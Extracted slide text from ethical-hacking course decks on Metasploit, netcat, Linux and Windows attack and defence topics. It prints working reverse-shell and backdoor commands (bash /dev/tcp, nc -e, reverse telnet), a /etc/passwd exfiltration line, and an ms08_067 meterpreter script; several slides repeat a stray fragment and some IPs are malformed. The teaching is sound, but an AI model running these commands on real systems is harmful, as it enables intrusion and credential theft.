[slide72.xml] Use Exploits Begin by typing  use command followed by  exploit/ ” the first part of the exploit Continue on using tab-completion until the whole exploit is written Example:  use exploit/windows/ dllinject / bind_tcp Then hit enter Notice the change in the prompt It now has your exploit incorporated in it Now we need to select the correct payload for our exploit to deliver  Note: If you need to back up to make a change Type “ back ”
[slide73.xml] Use Exploit Example
[slide74.xml] Finding a Payload Locate  the  payload  via  “ show payloads ” Provides  options  such  as  bind  shell,  add  users,   meterpreter ,  shell_reverse_tcp , etc. Once  payload  is  identified  ,  use  “ set PAYLOAD ” msf  >  db_import scan1.xml   msf  >  hosts  –c address Hosts ==== Address -------   192 .1 6 8 .1 0 .1 192.168.10.10 192.168.10.15 192.168.10.20
[slide75.xml] It’s All About the Options Now that  the exploit  and payload  has  been   selected: Identify  the  available options Use  “ show options ” Example shows: EXITFUNC LHOST LPORT Options  can include: THREADS RHOST/RPORT TARGET Etc. msf  >  db_import scan1.xml   msf  >  hosts  –c address Hosts ==== Address -------   192 .1 6 8 .1 0 .1 192.168.10.10 192.168.10.15 192.168.10.20
[slide76.xml] Pulling the Trigger Ready  to  launch  the attack? Use  the  “exploit” command Results  depend  on  the  exploit  & payload Should  get  a  shell  prompt,  meterpreter ,  etc.  based   on  your payload Go  back  to  the  msf prompt  by  using  [ CTRL ]  + [ z ] If you hit it twice it will drop  you  out  of msf You  can  type  “ exit ”  to  exit msf  >  db_import scan1.xml   msf  >  hosts  –c address Hosts ==== Address -------   192 .1 6 8 .1 0 .1 192.168.10.10 192.168.10.15 192.168.10.20
[slide77.xml] Metasploit Sessions The  sessions  command  allows  you to: List,  interact  with,  and  kill sessions Sessions  can  be  shells,  meterpreter , VNC… msf  >  db_import scan1.xml   msf  >  hosts  –c address Hosts ==== Address -------   192 .1 6 8 .1 0 .1 192.168.10.10 192.168.10.15 192.168.10.20
[slide78.xml] Metasploit Sessions Sometimes you may not receives a shell May see “Command Shell session 2 ( etc ) opened (IP  addr:port  -> IP  addr : port)” Followed a statement saying “Exploit Failed”, “Login Failed”, and “no session was created” List your  seesions  with session -l The -l switch is for list Open a session for interaction Use the  sessions - i  [n] [n] is the session ID number shown from the  sessions - i If you hit [ CTRL ] + [ z ] here, it will drop you to the background session Version 3.x supports different sessions for exploited systems Older versions only allowed 1 exploit at a time to 1 system
[slide79.xml] Using Resource Files Script  files  that  automate  commands within   msfconsole Contain  a  list  of  commands  executed  and run   sequentially Can  be  used  to  greatly  reduce  testing  & development   times  by  automating  repetitive actions root@kali :~#  echo  use  exploit/windows/ smb /ms08_067_netapi  >  example.rc root@kali :~#  echo  set  RHOST  192.168.10.10.100  >> example.rc root@kali :~#  echo  set  PAYLOAD  windows/ meterpreter / reverse_tcp >>  example.rc root@kali :~#  echo  set  LHOST  192.168.10.10.1  >> example.rc root@kali :~#  echo  exploit  >> example.rc root@kali :~# msfconsole msf >  resource example.rc resource ( example.rc )  >  use  exploit/windows/ smb /ms08_067_netapi   resource ( example.rc )

[slide81.xml] One of the Best Tools Netcat  is a networking utility Reads/Writes data across NW connections Described as a top 10 must have tool for hacking Provides inbound/outbound connections TCP/UDP to or from any port Built-in port scanning capabilities  Advanced options: Buffered send-mode (one line every n seconds) Port redirector, relays, pivoting Backdoor shell Originally written by Hobbit Also has other powerful options Socat  (data relay – SSL, Raw IP [no TCP/UDP – no routing] Cryptcat  (Encryption but just like  netcat ) Pycat  by Atlas (Nc.py) – python version Be careful since some Anti-virus blocks  Netcat What does the  RoE  say… probably won’t be able to disable AV msf  >  db_import scan1.xml   msf  >  hosts  –c address

[slide83.xml] File Transfer msf  >  db_import scan1.xml   msf  >  hosts  –c address Two Types of Transfer: Pull and Push  Pull a file from a listener back to the client Listen on port # and push input file  $  nc  -l -p [port #] < [Input File] Connect to target IP address on port  # and get file $  nc  –w2 [IP  addr ] [port #] > [output file] Push a file from client to listener Listen on port # and place results in output file $  nc  -l -p [port] > [output file] Push input file to destination IP address on port # $  nc  –w2 [IP  addr ] [port #] < [input file]
[slide84.xml] Netcat  Tricks msf  >  db_import scan1.xml   msf  >  hosts  –c address TCP Banner Grabber Pull a banner of any TCP service that is running on an IP address Start a connection to each port in the range Run with verbosity, no name resolve, wait no more than 2 seconds Send a blank string to open port and print any banner response Example: $ echo “” |  nc  -v -n -w2 192.168.10.10 0-300
[slide85.xml] Redirects msf  >  db_import scan1.xml   msf  >  hosts  –c address Lets look at /dev/ tcp It’s a built-in bash redirect to/from  /dev/ tcp /[IP  addr ]/[port] It’s available on most Linux distributions except Debian derivatives (e.g. – Ubuntu) Bash shell has been compiled to prevent redirections to/from  /dev/ tcp Example:   cat / etc /passwd > /dev/ tcp /192.168.10.10/2222 Collect on  dest . system with a  netcat  listener
[slide86.xml] Backdoor Shell msf  >  db_import scan1.xml   msf  >  hosts  –c address Listening backdoor on Windows Create a shell on a local port to be accessed with  nc C:\>  nc  -l -p [port #] -e cmd.exe Listening backdoor on Linux #  nc  -l -p [port #] -e /bin/bash Reverse backdoor shell Requires a listener on the destination box (e.g. –  nc ) to receive the backdoor shell On  Llinux #  nc  [IP  addr ] [port #] -e /bin/bash Create a shell on a local port to be accessed with  nc C:\>  nc  [IP  addr ] [port #] -e cmd.exe
[slide87.xml] Reverse Shell Backdoor msf  >  db_import scan1.xml   msf  >  hosts  –c address Lets make an interactive reverse shell backdoor  First invoke bash interactive mode /bin/bash - i Direct output to  /dev/ tcp /192.168.10.10/2222 Tell bash standard input [ 0 ] to be redirected [<] duplicated [ & ] standard output [ 1 ] Next, take standard error ( 2 ) and redirect to duplicated standard output [ 1 ] We don’t want an error window popping up on the victims system Put it all  together: /bin/bash - i  > /dev/ tcp /192.168.10.10/2222 0<&1 2>&1
[slide88.xml] Backpipe  Relays msf  >  db_import scan1.xml   msf  >  hosts  –c address Create a FIFO (a.k.a. pipe or  backpipe )  mknod  is a system call which creates a special file system node mknod backpipe  p Bash pipes only carry data in one direction Listener/Client Relay This creates a relay that sends packets from a local port to a  nc  client connected to the IP  addr /port # Example: nc  -l -p [port#] 0< backpipe  |  nc  [ dest . IP] [port] | tee  backpipe Listener/Listener Relay A relay that sends packets from any connection on local port1 to port2 Example : nc  -l -p [port1] 0< backpipe  |  nc  -l -p [port2] | tee  backpipe Client/Client Relay Sends packets from connection to previous IP  Addr /Port1 to Next IP  Addr  with  netcat  client connected on Port2 Example:  nc  [last IP] [port1] 0< backpipe  |  nc  [next IP] [port]  | tee  backpipe
[slide89.xml] Windows Relay msf  >  db_import scan1.xml   msf  >  hosts  –c address Listener/Client This creates a relay that sends packets from local port to a  nc  client connected to IP  addr /port # Example: C:\> echo  nc  [target IP] [port] > relay.bat C:\>  nc  -l  -p [local port] –e relay.bat Listener/Listener This creates a relay that sends packets from a local port to a  nc  client connected to the IP  addr /port # Example: C:\> echo  nc  -l -p  [local port 2] –e relay.bat C:\>  nc  -l -p [local port 1] –e relay.bat Client/Client Sends packets from connection to Previous IP  Addr /Port 1 to Next IP  Addr  with  netcat  client connected on Port 2 Example: C:\> echo  nc  [next IP] [port 2] > relay.bat C:\>  nc  [last IP] [port1] -e relay.bat
[slide90.xml] Reverse Telnet msf  >  db_import scan1.xml   msf  >  hosts  –c address So if we are on a Debian system then what?  Can’t do redirects from /dev/ tcp Linux telnet allows redirects with standard in/out Thus we have reverse Example: telnet [attacker  ip ] [port 1] | /bin/bash | telnet [attacker  ip ] [port 2] Gives commands on port 1 and gets output on port 2 What did we just do? Connected on the attacker’s IP  addr  on port 1 Commands from that telnet client are piped to /bin/bash for execution Next, the output from Bash is piped into another telnet to the attacker’s IP on port 2

[slide1.xml] Chapter Ten Exploitation Linux and Automated Assessment tools
[slide2.xml] Linux  Linux is open source, which means that it can be freely distributed and that you have the right to modify the source code.  Linux also provides an easy to way to develop your own programs.  This is one of the reasons that you will see many security tools released on Linux well before they ever make a debut in the Windows world.
[slide3.xml] Common Linux Directory Structure
[slide4.xml] Linux permissions When you log in to the system, you are identified by a user account. In addition to your user account, you might belong to a group or groups.  Files can have permissions set for a user, a group, or others.  Linux supports three default groups: super users, system users, and normal users.  Access for all of these groups has three options: Read Write Execute
[slide5.xml] Linux permissions To see the current permissions, owner, and group that belong to a file or directory, type the ls command.  The Ls command displays the contents of the directory you are in with the privileges for the user, group, and all others.  For example, $ Ls drwxr-xr-x  2 mikeg users  32768  Nov 20 00:31  demodir -rw-r--r--     1 mikeg users  4108    Nov 16 11:21  demofile
[slide6.xml] drwxr-xr-x  2 mikeg users  32768  Nov 20 00:31  demodir -rw-r--r--     1 mikeg users  4108    Nov 16 11:21  demofile If the first character (in the first column) is “ d “ , the item is a directory, as in the first item listed previously, demodir.   If the first letter is “-” the item is a file as in demofile. The next nine characters denote access and take the following form, rwx|rwx|rwx.  The  first three characters  (after the d or -) lists the access rights of the  USER ; therefore the user has read, write, and execute privileges to the demodir directory.  The  second three characters  lists the access rights of the GROUP ; therefore, the group has read and execute privileges for the demodir directory. The  last three characters  list the access rights of  ALL OTHERS;  therefore all others  have read and execute rights to the demodir directory.  The next column contains a number which indicates the number of links to the file or directory. The third column, mikeg, specifies the owner of the file/directory. The fourth column, users, is the name of the group for the file/ directory. The only one who can modify or delete any file in this directory is the owner mikeg.
[slide7.xml] Numerical equivalent An example of changing permissions for “file1: would be “chmod 640 file1”, which means that the  owner  has read and write permissions, the  group  has read permissions, and  all others  have no rights to the file.   The first number represents the Owner permission; the second represents the Group permissions; and the last number represents the permissions for All other users.  The numbers are a numerical representation of the rwx string.  r = 4 w = 2 x = 1 You add the numbers to get the integer/number representing the permissions you wish to set. You will need to include the numerical permissions for each of the three permission groups.  To change permissions on file1 to read _rwxr_____, you would enter $_____ To change permissions on file2 to read _rwxr--r___, you would enter $_____
[slide8.xml] Linux permissions To change permissions on file1 to read _rwxr_____, you would enter chmod 740 file1.  To change permissions on file2 to read _rwxr--r____, you would enter chmod 744 file2. 
[slide9.xml] The Linux file system Common Linux Commands https://www.guru99.com/linux-commands-cheat-sheet.html#1
[slide10.xml] Passwords and the Shadow File Users and programs are assigned a user ID (UID) and a group ID (GID).  The UID, GID, and password are stored in the  /etc/passwd  file.  Although Linux passwords are hashed, they can be added to the  /etc/shadow  file for additional security.  Moving the passwords to the shadow file makes it less likely that the encrypted password can be decrypted, because only the root user has access to the shadow file. 
[slide11.xml] Salts Another interesting fact about Linux systems is that the passwords use salts.  Salts are needed to add a layer of randomness to the passwords. Because MD5 is a hashing algorithm, if I were to use secret for my password and another user used secret for his password, encrypted values would look the same.  A salt can be one of 4,096 values and helps further scramble the password.  Under Linux, the MD5 password is 32 characters long and begins with $1$. The characters between the second and third $ represent the salt.
[slide12.xml] Linux Passwords Linux also has a host of password-cracking tools such as Hashcat, OphCrack, and John the Ripper.  John the Ripper . It is probably the most well-known, most versatile,password-cracking program around.  Best of all, it’s free and supports six different password hashing schemes that cover various flavors of UNIX and the Windows LANMan hashes.   It can use specialized word lists or password rules based on character type and placement. It runs on more than 12 different operating systems.  It comes preinstalled on many Linux distributions. 
[slide13.xml] Pluggable authentication modules (PAMs).  Passwords are one of the weakest forms of authentication If a new authentication scheme is going to be used, you need a way to alert applications to this fact without having to rewrite every piece of code already developed.  The answer to this challenge is Pluggable authentication modules (PAMs).  PAMs enable a program designed to forgo the worry of the types of authentication that will be performed and concentrate on the application itself. FreeBSD, Linux, Solaris, and others use PAMs. The role of a PAM is to control interaction between the user and authentication. This might be Telnet, FTP, logging in to the console, or changing a password.  PAMs support stronger authentication schemes, such as Kerberos, S/Key, and RADIUS. The directory that holds the configuration file and modules specific to a PAM is in /etc/pam.d/.
[slide14.xml] Compressing, Installing, and Compiling Linux In Linux, files are packaged and compressed in various ways.   One of the most common compression formats is  the Tape Archive program (tar).    It collects several files to a single file. It doesn’t do file compression; therefore, a second program is needed.   A program called  gzip  is one of the most common file-compression programs. Compiling a package from a source tarball is not always a simple procedure.  After uncompressing the package, you should search for a file called README, README.INSTALL, README.CONFIGURE, or something similar.  This file will usually describe the configuration and installation process.   Often, the source package includes a script called configure, which you execute to have the package autodetect your computer’s installed libraries and configure itself appropriately.   
[slide15.xml] Linux Compiler Linux comes with the GNU C compiler (GCC).  This capability also comes in handy when you download a C program from a security site or want to check out a piece of exploit code. With Linux, many programs might not be complied for you.
[slide16.xml] Hacking Linux Follows the same basic methodology Reconnaissance Scanning and enumeration Gaining access Escalating privilege Maintaining access Covering tracks and placing backdoors
[slide17.xml] TIP  If you want to hack a Linux system the legal way, check out Damn Vulnerable Linux. This distribution is loaded with vulnerable applications and misconfigured software.  It can be downloaded at  http://distrowatch.com/table.php?distribution=dvl
[slide18.xml] Reconnaissance Is about passive and active information gathering.  This might be scanning the organizational website, reviewing job postings, dumpster diving, social engineering. These include techniques such as dumpster diving, port scanning, reviewing the website, reading job ads, and so on.
[slide19.xml] Fingerprinting the O/S Scanning hosts for open ports can provide a good indication as to the hosts O/S.   Open ports, such as 21, 37, 79, 111, and 6000. Those represent programs such as FTP, Time, Finger, SunRpc, and X11. These are Linux utilities. Common Windows port numbers are 135-139, this are NETBIOS port numbers.
[slide20.xml] Linux Enumeration Tools Scanning is just the beginning. After any type of Linux or UNIX system is found, it still requires further probing to determine what’s running.  You can use tools such as banner grabbing. More importantly, if you think that the target is some flavor of UNIX, you have access to some programs, such as: Finger, Port 79 Rwho, Port 513 Rusers, and  Simple Mail Transfer Protocol(SMTP) Port 25
[slide21.xml] Linux Enumeration tools Rpcclient:  Can be used to enumerate usernames. Showmount:  Displays a list of all clients that have remotely mounted a file system on a remote host.  Finger : Enumerates the user and the host. It enables the attacker to view the user’s home directory, login time, idle times, office location, and the last time they both received or read mail. Enum4linux :  Used for enumerating information from Windows and Samba systems. The application basically acts as a wrapper around the Samba commands smbclient , rpclient , net , and nmblookup .
[slide22.xml] Rpcinfo, Rusers, and Rwho Is a Linux utility that makes an Remote Procedure Call (RPC) call to an RPC server and reports what it finds. Rusers, and Rwho are Remote Procedure Call (RPC) services that can give information about the various users on the system.  Running rpcinfo -p against the system will allow an attacker to learn the status of Rwho and Rusers. In other words are these programs active on the target system. The Rwho command displays information about all users who are currently logged in to machines on the local network.   Rusers depends on the Rwho daemon. Its output is very similar to Rwho.  It lists the users logged in to all local machines, in who format (hostnames, usernames).
[slide23.xml] SMTP  SMTP can sometimes be helpful in identifying users. Attackers gain this information by using the SMTP vrfy (verify) and expn (expand) commands. These commands can be used to guess users on the system. Simply input names, and if the user exists, you get back an email address with the @ sign.  If the user doesn’t exist, you get back a user unknown error message.
[slide24.xml] Gaining Access After a system has been scanned and enumerated, the next step is to gain access. Attempts to gain access can occur remotely or locally. Remote attacks are primarily carried out through one of four methods: Exploit a process or program. Exploit a Transmission Control Protocol (TCP) or User Datagram Protocol  (UDP) listening service. Exploit vulnerabilities in a system that is supplying routing services and providing security between two or more networks. Exploit the user by having him initiate some type of action such as running an email attachment or visiting a hostile website.
[slide25.xml] Privilege Escalation Privilege escalation can best be described as the act of leveraging a bug or vulnerability in an application or operating system to gain access to resources, which normally would have been protected from an average user.  The objective is to force an application to perform actions that are running within a higher security context than intended by the designer, and the hacker is granted full local access and control.    You will want to identify what services are running and identify if any have root privilege. This can include the following: ps aux ps -ef top cat /etc/service
[slide26.xml] Maintaining Access and Covering Tracks One of the best ways to maintain access is with a rootkit.  A rootkit contains a set of tools and replacement executables for many of the operating system’s critical components.  Once installed, a rootkit can be used to hide evidence of the attacker’s presence and to give the attacker backdoor access to the system.  Rootkits require root access, but in return they give the attacker complete control of the system.  The attacker can come and go at will and hide his activities from the administrator.  Rootkits can contain log cleaners that attempt to remove all traces of an attacker’s presence from the log files. Rootkits can be divided into several categories: Hypervisor: Modifies boot sequence of virtual machine Hardware/firmware: Hides in hardware or firmware Bootloader: Replaces the original bootloader Library level: Replaces original system calls Application level: Replaces applications binaries with fake ones Kernel level: Adds malware to the security kernel
[slide27.xml] Where Rootkits hide Traditionally, rootkits replaced binaries, such as ls , ifconfig , inetd , killall , login , netstat , passwd , pidof , or ps with Trojaned versions.  These Trojaned versions have been written to hide certain processes or information from the administrators. Rootkits of this type are detectable because of the change in size of the Trojaned binaries. Tools, such as MD5Sum and Tripwire, can be a big help in uncovering these types of hacks. Some rootkits target the loadable kernel module (LKM). A kernel rootkit is loaded as a driver or kernel extension. Because kernel rootkits corrupt the kernel, they can do basically anything, including avoiding detection by many software methods.  The best way to avoid these rootkits is just to recompile the kernel without support for LKMs.  Some rootkits can also hide their existence by using application programming interface (API) hooks. These hooks usually only work against other processes on the infected computer while the system is running.  If the system is analyzed as a static drive or by a third-party system, their existence may become apparent.  Although the use of rootkits is widespread, many administrators still don’t know much about them. 
[slide28.xml] Rootkits Adorm : This rootkit does not replace system binaries because it is an LKM rootkit. Adorm intercepts system calls and modifies them as required.  Adorm hijacks system calls and creates a wrapper around each call and then sanitizes the output. Flea : Once installed, Flea hides the attacker’s actions from the administrator, making it easy for the attacker to reenter the system at a later date. T0rm : This rootkit is popular with hackers and is notable because it breaks Netstat and the ps binary is 31336 bytes.  Both these items can give you clues that the rootkit has been installed. TDSS/Alureon : Unlike some of the previous rootkits, this one was designed for financial fraud and has the capability to bypass kernel mode driver signing.
[slide29.xml] Hardening Linux Use Nessus and SAINT (vulnerability scanners) to detect ways that attackers can get into your Linux systems and then patching them.  Placing a firewall in front of critical servers is also an important step. Programs, such as IPChains and IPTables, can also be used to filter and control traffic.  Another easy solution is to remove programs and services if they aren’t needed.  
[slide30.xml] Chroot  Chroot basically puts a program in a sandbox.  The term sandbox refers to the concept of limiting the activity of a program and applying boundaries.  More accurately, it redefines the root directory for a program or login session.  By using Chroot you are saying that the root directory is actually some other directory.  It effectively jails a process into one part of the file system from which the process cannot escape. Because of this lockdown, it is important to remember that any files a chrooted program needs for proper functionality must be present inside the jail. Chroot is commonly used by programs such as FTP, BIND, Mail, and Apache.
[slide31.xml] TCP Wrapper  TCP Wrappers add an additional layer of protection by defining which hosts are or are not allowed to connect to "wrapped" network services.  Network services such as Finger, FTP, Rlogin, Telnet, and TFTP can be configured for TCP Wrapper use.   TCP Wrappers: Allows you to specify which hosts are allowed access. Are activated by having inetd call the TCP Wrapper daemon (program). Can be used with TCP or UDP. Two files are used to verify access: host.allow and host.deny. The TCP Wrapper service works by inserting itself between the service and the outside world. You use two files for the management of access control: hosts.allow: Lists all hosts with connectivity to the system that can connect to a specific service. hosts.deny: Works in the same fashion as most ACLs; if it is not expressly permitted, access is then denied.
[slide32.xml] Tripwire  Tripwire is another valuable tool that secures Linux systems.  Tripwire is the most commonly used  file-integrity program. It performs integrity checking by using cryptographic checksums . Tripwire can help you identify whether any file tampering has occurred. It is commonly used with intrusion detection systems (IDS) because it can be used to maintain a snapshot of the system while in a known good state.   If rootkits or other changes are made, Tripwire can detect it. Tripwire performs its magic by creating a one-way hash value for files and directories. This hash is stored, and then periodically new scans are performed. The new scanned value is compared against the stored ones. If the two values do not match, a flag is set and an administrator must take action. 
[slide33.xml] Logging Although logging will not prevent an attack, it is a useful tool for determining what happened.  Linux will allow you to log systems, applications, and protocols.  The output of most logs are kept in the /var/log directory.  If you are curious about who has logged in to the system, you can use the lastlog file. The /var/log/lastlog file tracks the last login of user accounts into the system.
[slide34.xml] Automated Assessment Tools You can use these tools to scan internal or external computers for vulnerabilities. All these tools fit into three basic categories: Source code scanners  examine the source code of an application. Application scanners  examine a specific application or type of application. Vulnerability scanners (aka System level scanners)  examine entire systems or networks for configuration or application-level problems. 
[slide35.xml] Source Code Scanners Can detect problems such as buffer overflows, race conditions, privilege escalation, and tainted input.   Buffer overflows  enable to be inserted and executed into memory locations where it should not be inserted, which can allow a malicious user to do just about anything.   Race conditions  can prevent protective systems from functioning properly or deny the availability of resources to their rightful users.   Privilege escalation  occurs when code runs with higher privileges than that of the user who executed it.   Tainting of  input  allows potentially unchecked data through your defenses, possibly qualified as already error-checked information.  
[slide36.xml] Application-Level Scanners Application scanners provide testing against completed applications or components rather than against the source code.  This type of assessment tool looks at vulnerabilities as the program is running. 
[slide37.xml] Vulnerability Scanners They can probe entire systems and their components rather than individual applications.  A vulnerability scanner can be run against a single address or a range of addresses and can also test the effectiveness of layered security measures, such as a system running behind a firewall.   Nessus and OpenVas are good examples of vulnerability  scanner. You can use vulnerability scanners remotely.  Doing so is much more efficient than attempting to audit the configuration of each individual machine. 
[slide38.xml] Vulnerability Scanners Vulnerability scanners are not perfect. They cannot audit the source of the processes that are providing services, and they must rely on the responses of a service to a finite number of probes, meaning that all possible inputs cannot be reasonably tested.  Vulnerability scanners can also crash systems. Many of the tests they can perform are considered dangerous and can bring a system offline. 
[slide39.xml] TCP Wrapper  TCP Wrapper is tool that can be used to harden Linux. It’s now being replaced by xinetd.d, which is considered more granular.  Network services such as Finger, FTP, Rlogin, Telnet, and TFTP can be configured for TCP Wrapper use.   TCP Wrapper allows you to specify which hosts are allowed access. TCP Wrapper can be used with TCP or UDP. Two files are used to verify access: host.allow and host.deny. The TCP Wrapper service works by inserting itself between the program and the hosts that wants access. You use two files for the management of access control: hosts.allow: Lists all hosts who can connect to a specific service. hosts.deny: Works in the same fashion as most ACLs; if it is not expressly permitted, access is then denied.
[slide40.xml] Tripwire  Tripwire is another valuable tool that secures Linux systems.  Tripwire is the most commonly used  file-integrity program. It performs integrity checking by using cryptographic checksums . Tripwire can help you identify whether any file tampering has occurred.  It is commonly used with intrusion detection systems (IDS) because it can be used to maintain a snapshot of the system while in a known good state.  If rootkits or other changes are made, Tripwire can detect it.  Tripwire performs its magic by creating a one-way hash value for files and directories. This hash is stored, and then periodically new scans are performed. The new scanned value is compared against the stored ones. If the two values do not match, a flag is set and an administrator must take action. 
[slide41.xml] Automated Exploit Tools Automated tools such as Metasploit and others have long had the capability to integrate social engineering, scanning, attacking, planting backdoors, and reporting functions.  These tools take this functionality to the next step by tightly integrating the capability to exploit a suspected vulnerability.  That’s right; these tools can actually offer one-click exploitation. This section discusses the Metasploit, the Browser xploitation Framework (BeeEF), Canvas, and CORE Impact.
[slide42.xml] The End

DECK 11: Chapter Eleven - Windows Security, Passwords, Biometrics & Rootkits.pptx

[slide1.xml] Chapter Eleven Windows Security, Passwords, Biometrics & Rootkits
[slide2.xml] Windows protection ring model
[slide3.xml] Windows protection ring model Four rings:  The outer rings require less trust,  The inner rings require more trust. System has two modes:  User mode has restrictions, Ring 3 Kernel mode allows full access to all resources. Ring 0 Only the administrator account has the capability to perform kernel mode activities.  Rings 1 and 2 are not used.
[slide4.xml] Security Identifiers (SID) and Relative Identifiers (RID) Every user and program on a Windows box an account. Each account has a SID which identifies user, group, and accounts.   A RID is the portion of the SID that identifies a user or group in relation to the authority that user has. The administrator account has a RID of 500 by default, the guest has a RID 501, and the first user account has a RID of 1000. Each new user gets the next available RID
[slide5.xml] Windows SID and RID  S-1-5-21-4035617097-1094650281-2406268287-1981.  S  – The initial S identifies this as a SID.  1  – The revision level. This number has always been 1.  5  – The identifier for who issued the SID.  Typically 5, which represents the SECURITY_NT_AUTHORITY.  21-4035617097-1094650281-2406268287  – a domain and computer identifier.  1981  –  The RID  is the last part of a SID. Uniquely identifies a user or group relative to the user or groups security authority. 
[slide6.xml] User Id and Corresponding RID User ID  Code Admin  500 Guest  501 Kerberos  502 First user  1000 Second user  1001
[slide7.xml] Windows SAM file On a  standalone  Windows computer, user credentials  are stored in the Security Account Manager (SAM) database. The SAM database is stored in Windows/System32/config folder  and in a protected area of the Registry under HKLM\SAM.  If the system is part of a  domain , the domain controller stores the critical information in Active Directory (AD).  Remember stores the hash value of passwords in the SAM file.
[slide8.xml] Windows Registry  A hierarchical database  that contains information, settings, options, and other values for programs and hardware installed on all versions of Microsoft Windows operating systems.  For example, when a program is installed, a new subkey containing settings such as a program's location, its version, and how to start the program, are all added to the Windows Registry The registry contains two basic elements: keys and values. Registry keys are similar to folders.  Registry values are similar to files.  Keys may contain values and subkeys.   Keys are referenced with a syntax similar to Windows' path names, using backslashes to indicate levels of hierarchy. Keys must have a case insensitive name without backslashes. There are seven predefined root keys, traditionally named according to their constant handles defined in the Win32 API, or by synonymous abbreviations (depending on applications):  HKEY_LOCAL_MACHINE or HKLM HKEY_CURRENT_CONFIG or HKCC HKEY_CLASSES_ROOT or HKCR HKEY_CURRENT_USER or HKCU HKEY_USERS or HKU HKEY_PERFORMANCE_DATA (only in Windows NT, but invisible in the Windows Registry Editor) HKEY_DYN_DATA (only in Windows 9x, and visible in the Windows Registry Editor) Warning Don’t play with the registry unless you know what you are doing, it is very easy to screw up your machine.
[slide9.xml] Owning the Box and Physically attacking the machine Owning the Box The EC-Council considers remotely executing applications on the target machine is considered owning the machine. Physically attacking the machine Stealing SAM file is going to give the attacker potential access to all the passwords.  SAM  Contains the user account passwords stored in their hashed form.  Microsoft raised the bar with the release of NT Service Pack 3 by adding a second layer of encryption called SYSKEY.  SYSKEY  adds a second layer of 128-bit encryption.  After being enabled, this key is required by the system every time it is started so that the password data is accessible for authentication purposes.
[slide10.xml] Physically stealing the Sam file Attackers can steal the SAM through physical or logical access.  The SAM can be obtained from the NT ERD (Emergency Repair Disk) from C:\winnt\repair\sam.  Newer versions of Windows place a backup copy in C:\winnt\repair\regback\sam.  Or you can always just reset the passwords.  If you have physical access, you can simply use tools such as LINNT and NTFSDOS to  gain access. NTFSDOS can mount any NTFS partition as a logical drive. NTFSDOS is a read-only network file system driver for DOS/Windows.  If loaded onto a CD or thumb drive, it makes a powerful access tool.

[slide12.xml] Windows Authentication Protocols  Windows authentication protocols include the following: LM authentication : Used by 95/98/Me and is based on DES NTLM authentication : Used by NT until Service Pack 3 and is based on DES and MD4 NTLM v2 authentication : Used post-NT Service Pack 3 and is based on MD4 and MD5 Kerberos : Implemented first in Windows 2000 and can be used by all current versions of Windows, including Server 2012 and Windows 8 These are all important to know. Because of  backward compatibility , LM may still be used in some situations. LM encrypted passwords are particularly easy to crack because the password is uppercased, padded to 14 characters, and divided into two 7-character parts. The two hashed results are concatenated and stored as the LM hash, which is stored in SAM. 
[slide13.xml] Cracking the LM hash Remember 1404EE when it comes to LM authentication Bart: 1001: B79135112A43EC2AAD3B431404EE: DEAC47322ABERTE67D9C08A7958A: Homer: 1002: B83A4FB0461F70A3B435B51404EE: GFAWERTB7FFE33E43A2402D8DA37:
[slide14.xml] Directory Service A  directory service  is a customizable database that functions as a single point from which machines and applications can locate resources and services distributed throughout the network.  This customizable database also gives administrators a single point for managing the network.  Some directory services: X.500 LDAP Active Directory
[slide15.xml] Active Directory  Active Directory  is a solution developed by Microsoft to provide authentication and authorization  services  in a domain network.  The  Active Directory  core elements are an LDAP  directory  service, a Kerberos implementation as well as DNS  services .  Information on users, groups, and hosts is stored in the  directory  service.
[slide16.xml] Lightweight Directory Access Protocol (LDAP)  A set of protocols for accessing directories services, and is a directory service itself.   Used in Linux systems OpenLDAP is the most popular version of LDAP. LDAP is based on the X.500 standard, but is significantly simpler.  LDAP should eventually make it possible for almost any application running on virtually any computer platform to obtain directory information, such as email addresses and public keys. 
[slide17.xml] NetBIOS  A legacy protocol for Windows machines. It was designed to make it easier to find machines by naming them. A precursor to DNS. One way NetBIOS finds machines is by using the MS Browser Service and Master browser.   The browser service was designed to maintain host information about all the machines within the domain, the Master browser coordinates this information and allows machines and users to easily find each other.
[slide18.xml] NetBIOS  NetBIOS systems usually identify themselves by using a 15-character unique name.  NetBIOS is non-routable protocol.   NetBIOS ports UDP/TCP 137, and 138. NetBIOS is used in conjunction with Server Message Blocks (SMBs). SMB uses TCP port 445 and 139
[slide19.xml] SMB and IPC$ SMB allows remote access of shared directories and files on a Windows network. SMB services are provided through the ports 445 and 139.  SMB works with InterProcess Communication (IPC) which  offers a default share on Windows systems (IPC$). The Inter-Process Communication (IPC$) is a hidden network share on a Windows network. IPC$ can also be used to connect local and remote systems and also enable remote administration.  
[slide20.xml] Null Session  A null session occurs when you login to a system with no user ID and password at all.  In legacy Windows versions 2000, XP, Windows 2003, and Windows 7, a null session could be set up using the net command. The net command can be used to update, fix, or view the network or network settings. However its good to use the net view command to find some info about the target network prior to establishing a Null Session.
[slide21.xml] net view /domain command: C:\>net view /domain Domain SALES MARKETING ACCOUNTING The command completed successfully. This command has identified the sales, marketing, and accounting groups .

GetAcct  enables you to input the IP address or NetBIOS name of a target computer and extract account information. It can extract SID, RID, comments, full name, and so on.  SuperScan : Windows based. [slide28.xml] Simple Network Management Protocol (SNMP)  A TCP/IP utility for remote monitoring and management of devices on a network.    Versions 1 and 2, use community strings,  the SNMP Community string is like a user id or password that allows access to a device's statistics. If the community string is correct, the device responds with the requested information. If the community string is incorrect, the device simply discards the request and does not respond. SNMPv3 uses username/password authentication, along with an encryption key. SNMP version 3 offers data encryption and authentication, but version 1 and 2 are still in use.  Both version 1 and 2 are clear-text protocols that provides only weak security through the use of community strings.  Two community strings: The Public community string can only read The Private community string can read and write.
[slide29.xml] SNMP enumeration tools Can be found in both Windows and Linux.  snmpwalk:   A Linux command-line SNMP application that uses SNMP GETNEXT  requests to query a network entity for a tree of information. IP Network Browser : A GUI-based network discovery tool that enables you to perform a detailed discovery on one device or an entire subnet. SNScan : A free GUI-based SNMP scanner from Foundstone The best defense against SNMP enumeration is to turn it off.  If needed, block ports 161 and 162, and upgrade to SNMPv3 is possible.  Changing the community strings is another defensive tactic as is making them different in each zone of the network. SNMP Operation https://www.youtube.com/watch?v=tg47MZdtcAE    4:40
[slide30.xml] Simple Mail Transfer Protocol (SMTP) Enumeration Used for the transmission of email messages. Operates on TCP port 25.  Can be used to perform username enumeration.   SMTP enumeration can be performed with utilities like Netcat.  From the command line, you type the following: nc -v -z -w 2 IP Address  Other SMTP enumeration tools include the following: NetScan Tools Pro Nmap Telnet
